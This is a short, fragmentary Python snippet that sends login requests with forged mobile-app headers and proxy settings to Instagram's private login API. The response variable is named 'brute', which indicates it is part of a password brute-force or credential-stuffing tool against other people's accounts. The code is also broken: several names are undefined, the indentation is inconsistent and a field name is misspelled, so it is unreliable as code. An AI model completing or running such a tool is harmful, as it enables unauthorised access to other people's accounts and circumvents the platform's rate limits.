import requests

PROXY = {
    
      "http": f"http://{run}",
      "https": f"http://{run}"
  }

HEAD = {
    
    'Host': 'i.instagram.com', 
    'Accept': '*/*', 
    'User-Agent': User_Agent(), 
    'Cookie': 'missing', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US', 
    'X-IG-Capabilities': '3brTvw==', 
    'X-IG-Connection-Type': 'WIFI',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    
  }
 
  DATA = {
    
    'uuid': uuid.json()['uuid'], 
    'password': pess, 
    'username': self.user, 
    'device_id': uuid.json()['uuid'], 
    'from_reg': 'false', 
    '_csrftoken': 'missing', 
    'login_attempt_countn': '0'
  
  }

brute = requests.post('https://i.instagram.com/api/v1/accounts/login/',headers=HEAD, data=DATA,proxies=PROXY, allow_redirects=True)
